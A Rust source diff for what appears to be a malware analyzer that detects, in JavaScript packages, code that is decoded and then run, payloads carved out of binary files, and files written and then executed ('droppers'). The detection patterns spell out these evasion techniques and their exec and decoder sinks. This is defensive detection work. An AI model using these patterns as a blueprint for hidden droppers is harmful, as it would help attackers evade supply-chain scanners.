@@ -55,13 +55,219 @@ pub const K_CRED_FILE: u16 = 1 << 8;
 /// socket or a server is sent, what a download prints); run as code, it is
 /// received code
 pub const K_RECEIVED: u16 = 1 << 9;
+/// not local data: data the script decodes (base64, hex, a decompression,
+/// a decryption; in Python also an XOR, characters' codes, a reversal); run
+/// as code, it is code the script decodes
+pub const K_DECODED: u16 = 1 << 10;
+/// not local data: what a binary read of a file gives (its bytes; what:
+/// the file)
+pub const K_BYTES: u16 = 1 << 11;
+/// not local data: bytes taken from inside a file (a slice of a binary
+/// read that skips its start: `data[offset:]`, `buf.subarray(n)`; what:
+/// the file); written to a file and run, a program hidden in that file
+pub const K_CARVED: u16 = 1 << 12;
+/// not local data: a file opened for writing (what: the keys of its path,
+/// one per line: [`path_keys`])
+pub const K_WFILE: u16 = 1 << 13;
 
 /// The kinds' names (the text follower's strings), by bit index.
-pub const KIND_NAMES: [&str; 10] =
-    ["identity", "environment", "environment", "file", "report", "credentials", "address", "path", "file", "received"];
+pub const KIND_NAMES: [&str; 14] = [
+    "identity", "environment", "environment", "file", "report", "credentials", "address", "path", "file", "received",
+    "decoded", "bytes", "carved", "written",
+];
 
 /// The kinds a send of local data never reports.
-pub(crate) const NOT_LOCAL: u16 = K_PATH | K_RECEIVED;
+pub(crate) const NOT_LOCAL: u16 = K_PATH | K_RECEIVED | K_DECODED | K_BYTES | K_CARVED | K_WFILE;
+
+/// What a file written then run held: code or a program the script decodes,
+/// one it carves out of another file, one it downloads.
+pub(crate) const DROPPED: u16 = K_DECODED | K_CARVED | K_RECEIVED;
+
+/// A file the script writes: the keys of its path (`path_keys`), the kinds
+/// of what it writes there ([`DROPPED`]'s), what those were (the carved
+/// file's name), where.
+#[derive(Clone, Debug)]
+pub struct Written {
+    pub keys: Vec<PyStr>,
+    pub kinds: u16,
+    pub what: PyStr,
+    pub at: u32,
+}
+
+/// The files a script writes (its supply-chain model's table): a write is
+/// recorded once.
+pub(crate) fn record_written(table: &std::cell::RefCell<Vec<Written>>, keys: Vec<PyStr>, sc: &Sc, at: u32) {
+    let kinds = sc.kinds & DROPPED;
+    if kinds == 0 || keys.is_empty() {
+        return;
+    }
+    let carved = bit_index(K_CARVED);
+    let what = sc.firsts.iter().find(|(k, _, _)| *k == carved).map(|(_, w, _)| (**w).clone()).unwrap_or_default();
+    let mut t = table.borrow_mut();
+    if t.iter().any(|w| w.at == at && w.keys == keys) {
+        return;
+    }
+    t.push(Written { keys, kinds, what, at });
+}
+
+/// The interpreter a written file is run with, as a script: cmd runs
+/// whatever it is given, so only a batch file (`.bat`, `.cmd`) is its
+/// script; anything else it runs is a program (`cmd /c setup.exe`).
+pub(crate) fn script_interp(w: &Written, interp: Option<PyStr>) -> Option<PyStr> {
+    interp.filter(|i| {
+        !eq(i, "cmd")
+            || w.keys.iter().any(|k| {
+                k.first() == Some(&0x3D) && {
+                    let k = pystr::lower(k);
+                    pystr::ends_with(&k, ".bat") || pystr::ends_with(&k, ".cmd")
+                }
+            })
+    })
+}
+
+/// The written file a path's keys name, if any: what it held (the first
+/// write, by offset).
+pub(crate) fn written_at(table: &std::cell::RefCell<Vec<Written>>, keys: &[PyStr]) -> Option<Written> {
+    table.borrow().iter().filter(|w| w.keys.iter().any(|k| keys.contains(k))).min_by_key(|w| w.at).cloned()
+}
+
+/// A file the script writes, then runs (the tree's answer): the run's
+/// line, what the file held ([`DROPPED`]'s kinds), the file it was carved
+/// out of, the interpreter that runs it.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct DropRun {
+    pub line: usize,
+    pub kinds: u16,
+    pub what: PyStr,
+    pub interp: Option<PyStr>,
+}
+
+/// The first written file run among a model's findings.
+pub(crate) fn first_drop(text: &[u32], findings: &[Out]) -> Option<DropRun> {
+    findings
+        .iter()
+        .filter_map(|f| match f {
+            Out::Dropped { at, kinds, what, interp, .. } => Some((*at, *kinds, what, interp)),
+            _ => None,
+        })
+        .min_by_key(|d| d.0)
+        .map(|(at, kinds, what, interp)| {
+            let at = (at as usize).min(text.len());
+            DropRun { line: text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, kinds, what: what.clone(), interp: interp.clone() }
+        })
+}
+
+/// A command line's parts: literal text, or an expression.
+pub(crate) enum Part<T> {
+    Text(PyStr),
+    Expr(T),
+}
+
+/// Is a command line's word a flag (`-u`, `--x`, `/c`), not a script?
+pub(crate) fn is_flag(w: &[u32]) -> bool {
+    match w.first() {
+        Some(&0x2D) => true,
+        Some(&0x2F) => w.len() <= 3 && !w[1..].contains(&0x2F),
+        _ => false,
+    }
+}
+
+/// The expressions a command line made of parts runs: one at a command's
+/// start is its program (`p + ' -q'`, `` `"${p}"` ``, after `&&`); one
+/// after an interpreter and its flags is the script it runs (`'sh ' + p`).
+pub(crate) fn run_parts<T: Copy>(parts: &[Part<T>]) -> Vec<(T, Option<PyStr>)> {
+    let mut out = Vec::new();
+    let mut start = true;
+    let mut interp: Option<PyStr> = None;
+    for part in parts {
+        match part {
+            Part::Expr(e) => {
+                if start {
+                    out.push((*e, None));
+                } else if let Some(i) = interp.take() {
+                    out.push((*e, Some(i)));
+                }
+                start = false;
+                interp = None;
+            }
+            Part::Text(t) => {
+                for (k, seg) in t.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A).enumerate() {
+                    if k > 0 {
+                        start = true;
+                        interp = None;
+                    }
+                    let words: Vec<&[u32]> = pystr::split_ws(seg)
+                        .into_iter()
+                        .map(|w| pystr::strip_chars(w, "\"'`"))
+                        .filter(|w| !w.is_empty())
+                        .collect();
+                    if words.is_empty() {
+                        continue; // (blanks, quotes: where it was)
+                    }
+                    // (what follows the text is a word of its own)
+                    let apart = seg.last().is_some_and(|&c| crate::unicode::is_space(c) || c == 0x22 || c == 0x27);
+                    if start {
+                        start = false;
+                        interp = interp_name(words[0]).filter(|_| apart && words[1..].iter().all(|w| is_flag(w)));
+                    } else if interp.is_some() && !(apart && words.iter().all(|w| is_flag(w))) {
+                        interp = None;
+                    }
+                }
+            }
+        }
+    }
+    out
+}
+
+/// A path's key as its text: blanks dropped, every quote a double one
+/// (`dest + 'output'` and `dest + "output"` are one key).
+pub(crate) fn text_key(text: &[u32]) -> PyStr {
+    text.iter()
+        .filter(|&&c| !crate::unicode::is_space(c))
+        .map(|&c| if c == 0x27 || c == 0x60 { 0x22 } else { c })
+        .collect()
+}
+
+/// A path's key as a string it holds (`=` and the string, `./` dropped).
+pub(crate) fn value_key(s: &[u32]) -> PyStr {
+    let mut t: &[u32] = s;
+    while t.len() > 2 && t[0] == 0x2E && t[1] == 0x2F {
+        t = &t[2..];
+    }
+    let mut k = vec![0x3Du32];
+    k.extend_from_slice(t);
+    k
+}
+
+/// The interpreter a program's name is, as reasons name it (`Python`,
+/// `node`, `bash` …), if it is one.
+pub(crate) fn interp_name(program: &[u32]) -> Option<PyStr> {
+    let base = match program.iter().rposition(|&c| c == 0x2F || c == 0x5C) {
+        Some(k) => &program[k + 1..],
+        None => program,
+    };
+    let base = if base.len() > 4 && eq(&base[base.len() - 4..], ".exe") { &base[..base.len() - 4] } else { base };
+    if base.len() >= 6 && eq(&base[..6], "python") {
+        return Some(u("Python"));
+    }
+    if is_one(base, &["node", "nodejs"]) {
+        return Some(u("node"));
+    }
+    if is_one(base, INTERPRETERS) || is_one(base, &["cscript", "wscript"]) {
+        return Some(base.to_vec());
+    }
+    None
+}
+
+/// Where a value's decoded data was decoded (the decoding's offset), if it
+/// holds some.
+pub(crate) fn decoded_at(sc: &Sc) -> Option<u32> {
+    if sc.kinds & K_DECODED == 0 {
+        return None;
+    }
+    let bit = bit_index(K_DECODED);
+    sc.firsts.iter().filter(|(k, _, _)| *k == bit).map(|(_, _, a)| *a).min()
+}
 
 /// The kinds that count even when only an address holds them (the text
 /// follower's `_LD_NOT_IN_ADDRESS` are the others, the whole environment
@@ -136,6 +342,13 @@ pub const LOAD_NAME: u8 = 6;
 pub const DESERIALIZE: u8 = 7;
 
 /// A received-code category's name (`_DL_CATEGORY_REASON`'s keys).
+/// The calls that decode what they are given (the text rule's
+/// `_DECODE_CALL_RE`, read by name).
+const DECODERS: &[&str] = &[
+    "atob", "window.atob", "globalThis.atob", "self.atob", "global.atob", "zlib.inflateSync", "zlib.inflateRawSync",
+    "zlib.gunzipSync", "zlib.unzipSync", "zlib.brotliDecompressSync",
+];
+
 pub fn received_cat(cat: u8) -> Option<&'static str> {
     match cat {
         RUN_CODE => Some("run"),
@@ -159,6 +372,9 @@ pub struct Supply {
     /// a function given as an argument -> the call it is given to (built
     /// when first asked)
     pub arg_of: std::cell::RefCell<Option<std::collections::HashMap<NodeId, NodeId>>>,
+    /// the files the script writes code or a program to (a run of one is
+    /// a dropper's)
+    pub written: std::cell::RefCell<Vec<Written>>,
 }
 
 use std::collections::HashSet;
@@ -174,6 +390,7 @@ impl Supply {
             outside: std::cell::RefCell::new(HashSet::new()),
             whole,
             arg_of: std::cell::RefCell::new(None),
+            written: std::cell::RefCell::new(Vec::new()),
         }
     }
 
@@ -217,6 +434,13 @@ const CONN_CHAIN: &[&str] =
 const EXEC_NAMES: &[&str] =
     &["execSync", "execFileSync", "spawnSync", "exec", "execFile", "execa", "execaSync", "execaCommand", "execaCommandSync"];
 const FETCHERS: &[&str] = &["fetch", "axios.get", "http.get", "https.get", "got", "got.get"];
+/// The calls that write data to a file by its path (fs, fs-extra).
+const WRITE_FILES: &[&str] = &["writeFileSync", "writeFile", "appendFileSync", "appendFile", "outputFileSync", "outputFile"];
+
+/// Is a name WebAssembly's (`WebAssembly.compile`, `WebAssembly.Module`)?
+fn is_web_assembly(name: &[u32]) -> bool {
+    name.len() > 12 && eq(&name[..12], "WebAssembly.")
+}
 
 fn last_part(name: &[u32]) -> &[u32] {
     match name.iter().rposition(|&c| c == 0x2E) {
@@ -959,6 +1183,18 @@ impl<'p> Eval<'p> {
                 self.findings.push(Out::Received { at, cat: name });
             }
         }
+        // (code the script decodes, run)
+        if v.src && self.emit && cat == RUN_CODE {
+            if let Some(from) = v.sc.as_ref().and_then(|s| decoded_at(s)) {
+                self.findings.push(Out::Decoded { at, from });
+            }
+        }
+    }
+
+    /// supply mode: a value the script decodes at `at` (`atob(x)`, a
+    /// decryption …).
+    pub(super) fn sc_decoded(&self, what: PyStr, at: u32, line: u32) -> V {
+        self.sc_source(K_DECODED, what, at, line, 0)
     }
 
     /// A string a node folds to: a literal, a template without holes, their
@@ -1272,6 +1508,12 @@ impl<'p> Eval<'p> {
         if named("_compile") || named("runInThisContext") || named("runInNewContext") || named("runInContext") || named("compileFunction") {
             return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
         }
+        // (an execSync of any object runs its command line, as the text's
+        // reading counts it: no regular expression or database has one; an
+        // `exec` is child_process's only by its names)
+        if named("execSync") {
+            return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
+        }
         // o['eval'](code), o['Function'](code)
         if computed && named("eval") {
             return Some(Runs { cat: RUN_CODE, from: 0, rest: false });
@@ -1328,6 +1570,382 @@ impl<'p> Eval<'p> {
         interp
             && a.kind(second) == Kind::ArrayExpression
             && a.list(second, jt::A).iter().any(|&e| e != NONE && self.sc_const_str(e).is_some_and(|s| is_one(&s, EVAL_FLAGS)))
+    }
+
+    // ------------------------------------------- a file written, then run --
+
+    /// The interpreter a program node is, as reasons name it (`node` for
+    /// `process.execPath`).
+    fn sc_interp_name(&self, n: NodeId) -> Option<PyStr> {
+        if let Some(s) = self.sc_const_str(n) {
+            return interp_name(&s);
+        }
+        let a = self.a();
+        let nd = &a.0.nodes[n as usize];
+        let text = self.sup().span(nd.start, nd.end).to_vec();
+        (eq(&text, "process.execPath") || eq(&text, "process.argv[0]")).then(|| u("node"))
+    }
+
+    /// The keys of the path a node names, to tell a file run is one the
+    /// script wrote: its text in the scope of the first name in it that is
+    /// bound (one function's local `p` is not another's), the strings it
+    /// holds (a literal, a name given one), and those of what a wrapper is
+    /// given (`path.resolve(p)`, `String(p)`, `` `${p}` ``, `p.toString()`).
+    fn sc_path_keys(&mut self, n: NodeId, scope: ScopeId) -> Vec<PyStr> {
+        let mut keys = Vec::new();
+        self.sc_path_keys_at(n, scope, 0, &mut keys);
+        keys.sort_unstable();
+        keys.dedup();
+        keys
+    }
+
+    fn sc_path_keys_at(&mut self, n: NodeId, scope: ScopeId, depth: u32, keys: &mut Vec<PyStr>) {
+        if n == NONE || depth > 3 {
+            return;
+        }
+        let n = self.a().unwrap(n);
+        if let Some(s) = self.sc_const_str(n) {
+            keys.push(value_key(&s));
+            return;
+        }
+        // (the names it reads: not a member's own name)
+        let idents: Vec<NodeId> = {
+            let a = self.a();
+            let mut out = Vec::new();
+            let mut stack = vec![n];
+            while let Some(x) = stack.pop() {
+                if out.len() > 16 {
+                    break;
+                }
+                match a.kind(x) {
+                    Kind::Identifier => out.push(x),
+                    Kind::MemberExpression if !a.computed(x) => stack.push(a.at(x, jt::A)),
+                    _ => stack.extend(a.kids(x).into_iter().rev()),
+                }
+            }
+            out
+        };
+        let bound = idents.iter().find_map(|&i| self.bind(i, scope));
+        let mut k = u(&match bound {
+            Some(b) => format!("b{}:", b),
+            None => "g:".to_string(),
+        });
+        let (lo, hi) = {
+            let nd = &self.a().0.nodes[n as usize];
+            (nd.start, nd.end)
+        };
+        k.extend(text_key(self.sup().span(lo, hi)));
+        keys.push(k);
+        let kind = self.a().kind(n);
+        match kind {
+            Kind::Identifier => {
+                if let Some(values) = self.sc_const_strs(n, scope, 0) {
+                    keys.extend(values.iter().map(|v| value_key(v)));
+                }
+            }
+            Kind::TemplateLiteral => {
+                let (quasis, exprs) = {
+                    let a = self.a();
+                    (a.list(n, jt::A).to_vec(), a.list(n, jt::B).to_vec())
+                };
+                if exprs.len() == 1 && quasis.iter().all(|&q| self.a().s(q, jt::A).is_empty()) {
+                    self.sc_path_keys_at(exprs[0], scope, depth + 1, keys);
+                }
+            }
+            Kind::CallExpression => {
+                let (callee, args) = {
+                    let a = self.a();
+                    (a.unwrap(a.at(n, jt::A)), a.list(n, jt::B).to_vec())
+                };
+                let names = self.sc_names(callee, scope);
+                let wrapper = names.iter().any(|x| is_one(x, &["path.resolve", "path.normalize", "String", "path.posix.resolve", "path.win32.resolve"]));
+                if wrapper && args.len() == 1 {
+                    self.sc_path_keys_at(args[0], scope, depth + 1, keys);
+                } else if args.is_empty() && self.a().kind(callee) == Kind::MemberExpression && self.a().prop_name(callee).is_some_and(|p| eq(&p, "toString")) {
+                    let obj = self.a().at(callee, jt::A);
+                    self.sc_path_keys_at(obj, scope, depth + 1, keys);
+                }
+            }
+            _ => {}
+        }
+    }
+
+    /// The parts a command line is made of: a sum's operands, a template's
+    /// text and holes, else the node.
+    fn sc_parts(&self, n: NodeId) -> Vec<Part<NodeId>> {
+        let a = self.a();
+        let n = a.unwrap(n);
+        match a.kind(n) {
+            Kind::BinaryExpression if a.operator(n) == "+" => {
+                let mut out = self.sc_parts(a.at(n, jt::A));
+                out.extend(self.sc_parts(a.at(n, jt::B)));
+                out
+            }
+            Kind::TemplateLiteral => {
+                let (quasis, exprs) = (a.list(n, jt::A), a.list(n, jt::B));
+                let mut out = Vec::new();
+                for (k, &q) in quasis.iter().enumerate() {
+                    out.push(Part::Text(a.s(q, jt::A).to_vec()));
+                    if let Some(&e) = exprs.get(k) {
+                        out.push(Part::Expr(e));
+                    }
+                }
+                out
+            }
+            _ => match self.sc_const_str(n) {
+                Some(s) => vec![Part::Text(s)],
+                None => vec![Part::Expr(n)],
+            },
+        }
+    }
+
+    /// supply mode: what a binary read of a file gives (`readFileSync(p)`,
+    /// `readFile(p, cb)`: no encoding): its bytes (K_BYTES, what: the file).
+    fn sc_binary_read(&mut self, node: NodeId, name: Option<&[u32]>, scope: ScopeId) -> Option<V> {
+        let name = name?;
+        if !is_one(name, &["readFileSync", "readFile"]) {
+            return None;
+        }
+        let args = self.a().list(node, jt::B).to_vec();
+        let first = *args.first()?;
+        if let Some(&opts) = args.get(1) {
+            let a = self.a();
+            let text_read = match a.kind(opts) {
+                Kind::Literal => a.is_string(opts),
+                Kind::ObjectExpression => {
+                    let nd = &a.0.nodes[opts as usize];
+                    pystr::contains(self.sup().span(nd.start, nd.end), "encoding")
+                }
+                Kind::ArrowFunctionExpression | Kind::FunctionExpression => false,
+                _ => true, // (options the script keeps elsewhere: not known to be bytes)
+            };
+            if text_read {
+                return None;
+            }
+        }
+        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
+        let what = match self.sc_const_strs(first, scope, 0).and_then(|v| v.into_iter().next()).or_else(|| self.sc_path_tail(first, scope, 0)) {
+            Some(v) => pystr::upto(&v, 60).to_vec(),
+            None => {
+                let nd = &self.a().0.nodes[first as usize];
+                pystr::upto(self.sup().span(nd.start, nd.end), 60).to_vec()
+            }
+        };
+        Some(self.sc_source(K_BYTES, what, at, line, 0))
+    }
+
+    /// The literal end of a path a node builds, to name the file
+    /// (`path.join(__dirname, 'assets', 'logo.png')`: assets/logo.png;
+    /// `__dirname + '/x.bin'`, `` `${d}/x.bin` ``).
+    fn sc_path_tail(&mut self, n: NodeId, scope: ScopeId, depth: u32) -> Option<PyStr> {
+        if depth > 4 {
+            return None;
+        }
+        let n = self.a().unwrap(n);
+        let mut tail: Vec<PyStr> = Vec::new();
+        match self.a().kind(n) {
+            Kind::CallExpression => {
+                let callee = self.a().unwrap(self.a().at(n, jt::A));
+                let names = self.sc_names(callee, scope);
+                if !names.iter().any(|x| is_one(x, &["path.join", "path.resolve", "path.posix.join", "path.win32.join"])) {
+                    return None;
+                }
+                let args = self.a().list(n, jt::B).to_vec();
+                for &x in args.iter().rev() {
+                    match self.sc_const_str(x) {
+                        Some(v) => tail.push(v),
+                        None => break,
+                    }
+                }
+            }
+            Kind::BinaryExpression if self.a().operator(n) == "+" => {
+                let (l, r) = (self.a().at(n, jt::A), self.a().at(n, jt::B));
+                match self.sc_const_str(r) {
+                    Some(v) => {
+                        tail.push(v);
+                        if let Some(more) = self.sc_path_tail(l, scope, depth + 1) {
+                            tail.push(more);
+                        }
+                    }
+                    None => return None,
+                }
+            }
+            Kind::TemplateLiteral => {
+                let last = *self.a().list(n, jt::A).last()?;
+                tail.push(self.a().s(last, jt::A).to_vec());
+            }
+            _ => return None,
+        }
+        tail.reverse();
+        let mut out: PyStr = Vec::new();
+        for piece in &tail {
+            let piece = pystr::strip_chars(piece, "/\\");
+            if piece.is_empty() {
+                continue;
+            }
+            if !out.is_empty() {
+                out.push(0x2F);
+            }
+            out.extend_from_slice(piece);
+        }
+        (!out.is_empty()).then_some(out)
+    }
+
+    /// supply mode: `buf.subarray(n)`, `buf.slice(n, m)` of a binary read,
+    /// past its start: bytes carved out of the file (K_CARVED).
+    fn sc_carved(&self, node: NodeId, recv: &V, name: Option<&[u32]>) -> Option<V> {
+        let sc = recv.sc.as_ref()?;
+        if sc.kinds & K_BYTES == 0 || !name.is_some_and(|n| is_one(n, &["slice", "subarray"])) {
+            return None;
+        }
+        let a = self.a();
+        let first = *a.list(node, jt::B).first()?;
+        if a.kind(first) == Kind::Literal && a.op(first) == jt::L_NUMBER && {
+            let nd = &a.0.nodes[first as usize];
+            eq(self.sup().span(nd.start, nd.end), "0")
+        } {
+            return None;
+        }
+        let bit = bit_index(K_BYTES);
+        let what = sc.firsts.iter().find(|(k, _, _)| *k == bit).map(|(_, w, _)| (**w).clone()).unwrap_or_default();
+        let (at, line) = (a.0.nodes[node as usize].start, self.call_line(node));
+        Some(self.sc_source(K_CARVED, what, at, line, 0))
+    }
+
+    /// supply mode: a call that writes a file. `createWriteStream(p)` is the
+    /// file (its value, K_WFILE, carries the path's keys); `writeFileSync(p,
+    /// d)`, a stream's `write(d)` or `end(d)`, `src.pipe(stream)` record what
+    /// they write where (`Supply::written`). Some(value) for a stream made.
+    fn sc_file_write(&mut self, node: NodeId, member: bool, name: Option<&[u32]>, recv: &V, args: &[V], scope: ScopeId) -> Option<V> {
+        let name = name?;
+        let at = self.a().0.nodes[node as usize].start;
+        let arg_nodes = self.a().list(node, jt::B).to_vec();
+        if eq(name, "createWriteStream") {
+            let keys = self.sc_path_keys(*arg_nodes.first()?, scope);
+            let what = pystr::join(&u("\n"), &keys.iter().map(|k| k.as_slice()).collect::<Vec<_>>());
+            return Some(self.sc_source(K_WFILE, what, at, self.call_line(node), 0));
+        }
+        let stream_keys = |v: &V| -> Option<Vec<PyStr>> {
+            let sc = v.sc.as_ref()?;
+            let (_, what, _) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_WFILE)?;
+            Some(pystr::split_char(what.as_slice(), 0x0A).into_iter().map(|k| k.to_vec()).collect())
+        };
+        let (keys, data): (Vec<PyStr>, Option<V>) = if is_one(name, WRITE_FILES) {
+            match arg_nodes.first() {
+                Some(&p) => (self.sc_path_keys(p, scope), args.get(1).cloned()),
+                None => return None,
+            }
+        } else if member && is_one(name, &["write", "end"]) {
+            match stream_keys(recv) {
+                Some(k) => (k, args.first().cloned()),
+                None => return None,
+            }
+        } else if member && eq(name, "pipe") {
+            match args.first().and_then(|a| stream_keys(a)) {
+                Some(k) => (k, Some(recv.plain())),
+                None => return None,
+            }
+        } else {
+            return None;
+        };
+        if let Some(sc) = data.as_ref().filter(|d| d.src).and_then(|d| d.sc.clone()) {
+            record_written(&self.sup().written, keys, &sc, at);
+        }
+        None
+    }
+
+    /// supply mode: a call that runs a program (`spawn(p)`, `execSync(p +
+    /// ' -q')`, `fork(p)`, an interpreter given a script): a file the script
+    /// wrote with code or a program it decodes, carves out of another file,
+    /// or downloads (a script run by an interpreter) is a dropper's; a
+    /// program it decodes, run, is code it decodes.
+    fn sc_file_run(&mut self, node: NodeId, names: &[PyStr], member: bool, name: Option<&[u32]>, args: &[V], scope: ScopeId) {
+        let simple = name.unwrap_or(&[]);
+        let cp = names.iter().any(|x| x.len() > 14 && eq(&x[..14], "child_process."));
+        let is = |n: &str| eq(simple, n) || names.iter().any(|x| x.len() > 14 && eq(&x[..14], "child_process.") && eq(&x[14..], n));
+        let shell = ["exec", "execSync", "execaCommand", "execaCommandSync"].iter().any(|n| is(n));
+        let program = ["spawn", "spawnSync", "execFile", "execFileSync", "execa", "execaSync"].iter().any(|n| is(n));
+        let fork = is("fork");
+        // (`re.exec(s)`, `db.exec(sql)`: a member named exec is child_process's only by its names)
+        if !(shell || program || fork) || (member && eq(simple, "exec") && !cp) {
+            return;
+        }
+        let at = self.a().0.nodes[node as usize].start;
+        let arg_nodes = self.a().list(node, jt::B).to_vec();
+        let first = match arg_nodes.first() {
+            Some(&f) => self.a().unwrap(f),
+            None => return,
+        };
+        let mut runs: Vec<(NodeId, Option<PyStr>)> = Vec::new();
+        let mut lines: Vec<PyStr> = Vec::new();
+        if fork {
+            runs.push((first, Some(u("node"))));
+        } else if shell {
+            match self.sc_const_str(first) {
+                Some(s) => lines.push(s),
+                None if self.a().kind(first) == Kind::Identifier => lines.extend(self.sc_const_strs(first, scope, 0).unwrap_or_default()),
+                None => {}
+            }
+            let parts = self.sc_parts(first);
+            runs.extend(run_parts(&parts));
+        } else {
+            runs.push((first, None));
+            if let Some(interp) = self.sc_interp_name(first) {
+                if let Some(&list) = arg_nodes.get(1) {
+                    if self.a().kind(list) == Kind::ArrayExpression {
+                        let items: Vec<NodeId> = self.a().list(list, jt::A).iter().copied().filter(|&e| e != NONE).take(6).collect();
+                        if let Some(s) = items.into_iter().find(|&x| !self.sc_const_str(x).is_some_and(|s| is_flag(&s))) {
+                            runs.push((s, Some(interp)));
+                        }
+                    }
+                }
+            }
+            // (a program it decodes, run)
+            if let Some(v) = args.first() {
+                if v.src && self.emit {
+                    if let Some(from) = v.sc.as_ref().and_then(|s| decoded_at(s)) {
+                        self.findings.push(Out::Decoded { at, from });
+                    }
+                }
+            }
+        }
+        if !self.emit {
+            return;
+        }
+        let sup = self.sup();
+        for (n, interp) in runs {
+            let keys = self.sc_path_keys(n, scope);
+            if let Some(w) = written_at(&sup.written, &keys) {
+                self.sc_dropped(&w, interp, at);
+                return;
+            }
+        }
+        // a constant command line: a written file it runs (`_DL_RUNNERS`)
+        if !lines.is_empty() {
+            let table = sup.written.borrow().clone();
+            for w in table {
+                for k in w.keys.iter().filter(|k| k.first() == Some(&0x3D)) {
+                    let seg = lines.iter().flat_map(|l| l.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A)).find(|seg| {
+                        crate::received::command_runs(sup.p(), seg, &k[1..])
+                    });
+                    if let Some(seg) = seg {
+                        let interp = pystr::split_ws(seg).first().and_then(|w| interp_name(w));
+                        self.sc_dropped(&w, interp, at);
+                        return;
+                    }
+                }
+            }
+        }
+    }
+
+    /// The finding for a written file run: what it held decoded or carved
+    /// out of another file, or downloaded and run by an interpreter.
+    fn sc_dropped(&mut self, w: &Written, interp: Option<PyStr>, at: u32) {
+        let interp = script_interp(w, interp);
+        if w.kinds & (K_DECODED | K_CARVED) == 0 && interp.is_none() {
+            return; // (a program downloaded and run: what installers of binaries do)
+        }
+        self.findings.push(Out::Dropped { at, from: w.at, kinds: w.kinds, what: w.what.clone(), interp });
     }
 
     /// Is a call's first argument a command line that downloads (curl or
@@ -1642,6 +2260,22 @@ impl<'p> Eval<'p> {
                 self.sc_sink(r.cat, &v, at);
             }
         }
+        // a WebAssembly module compiled or instantiated: not the bytes it was
+        // made of (es-module-lexer's, decoded from base64, runs no code)
+        if names.iter().any(|n| is_web_assembly(n)) {
+            return Ok(V::empty());
+        }
+        // a file written, then run: what is written where, a run of it
+        if let Some(file) = self.sc_file_write(node, member, name.as_deref(), recv, args, scope) {
+            return Ok(file);
+        }
+        self.sc_file_run(node, &names, member, name.as_deref(), args, scope);
+        // a binary read: the file's bytes (its callbacks get them)
+        if let Some(bytes) = self.sc_binary_read(node, name.as_deref(), scope) {
+            let src = self.sc_source_call(node, &names, args, scope).unwrap_or_else(V::empty).union(&bytes);
+            let cb = self.sc_callbacks(node, &src, scope);
+            return Ok(src.union(&cb.plain()));
+        }
         // a read of local data: its value, and its callbacks get it
         if let Some(src) = self.sc_source_call(node, &names, args, scope) {
             let cb = self.sc_callbacks(node, &src, scope);
@@ -1807,6 +2441,13 @@ impl<'p> Eval<'p> {
                 }
             }
         }
+        // a decoder: what it returns is data the script decodes (`atob(x)`,
+        // `Buffer.from(x, 'base64')`, a decryption, zlib's decompressions)
+        if self.sc_is_decoder(node, &names, member, name.as_deref()) {
+            let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
+            let what = names.first().cloned().unwrap_or_else(|| u("a decoder"));
+            v = v.union(&self.sc_decoded(what, at, line));
+        }
         // what the call makes: a connection, a client; a connection's own
         // methods give it back
         let mut mark = 0u8;
@@ -1822,7 +2463,28 @@ impl<'p> Eval<'p> {
         if mark != 0 {
             v = V { kind: v.kind | mark, ..v };
         }
+        // bytes carved out of a binary read: `buf.subarray(offset)`
+        if member {
+            if let Some(c) = self.sc_carved(node, recv, name.as_deref()) {
+                v = v.union(&c);
+            }
+        }
         Ok(v)
+    }
+
+    /// Is the call a decoder: `atob`, zlib's synchronous decompressions, a
+    /// method named `decrypt`, `Buffer.from(x, 'base64' | 'base64url' | 'hex')`?
+    fn sc_is_decoder(&self, node: NodeId, names: &[PyStr], member: bool, name: Option<&[u32]>) -> bool {
+        if names.iter().any(|n| is_one(n, DECODERS)) || (member && name.is_some_and(|n| eq(n, "decrypt"))) {
+            return true;
+        }
+        if names.iter().any(|n| eq(n, "Buffer.from")) {
+            let list = self.a().list(node, jt::B);
+            if let Some(enc) = list.get(1).and_then(|&e| self.sc_const_str(e)) {
+                return is_one(&enc, &["base64", "base64url", "hex"]);
+            }
+        }
+        false
     }
 
     /// supply mode: `new X(…)`: a connection (a socket, an XMLHttpRequest,
@@ -1860,6 +2522,10 @@ impl<'p> Eval<'p> {
         } else if names.iter().any(|n| is_one(n, &["vm.Script", "vm.SourceTextModule"])) {
             let v = if spread == 0 { union_all(args) } else { args.first().cloned().unwrap_or_else(V::empty) };
             self.sc_sink(RUN_CODE, &v, at);
+        }
+        // (a WebAssembly module or instance: not the bytes it was made of)
+        if names.iter().any(|n| is_web_assembly(n)) {
+            return V::empty();
         }
         let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
         let mut v = union_all(&plains);
@@ -1962,6 +2628,12 @@ fn outside_names(prog: &Program, sup: &Supply) -> HashSet<PyStr> {
 pub struct Facts {
     pub sent: Answer,
     pub received: Option<(usize, &'static str)>,
+    /// code the script decodes, run: (the run's offset, the decoding's), in
+    /// the text's order
+    pub decoded: Vec<(usize, usize)>,
+    /// the first file the script writes, then runs, holding code or a
+    /// program it decodes, carves out of another file or downloads
+    pub dropped: Option<DropRun>,
 }
 
 thread_local! {
@@ -2000,6 +2672,19 @@ pub fn received_code(text: &[u32]) -> Option<Option<(usize, &'static str)>> {
     facts(text).map(|f| f.received)
 }
 
+/// Code a JavaScript text decodes and runs, read on its tree: Some((the
+/// run's offset, the decoding's) for each), or None when the tree could not
+/// say.
+pub fn decoded_runs(text: &[u32]) -> Option<Vec<(usize, usize)>> {
+    facts(text).map(|f| f.decoded.clone())
+}
+
+/// A file a JavaScript text writes, then runs (a dropper's), read on its
+/// tree: Some(the first, or None), or None when the tree could not say.
+pub fn dropped_run(text: &[u32]) -> Option<Option<DropRun>> {
+    facts(text).map(|f| f.dropped.clone())
+}
+
 fn facts_here(text: &[u32]) -> Option<Facts> {
     let pack = crate::pack::current();
     let path = u("script.js");
@@ -2028,6 +2713,8 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
     // over other data, then the first; the first received code
     let mut best: Option<((bool, bool, u32), &'static str, PyStr)> = None;
     let mut first: Option<(u32, &'static str)> = None;
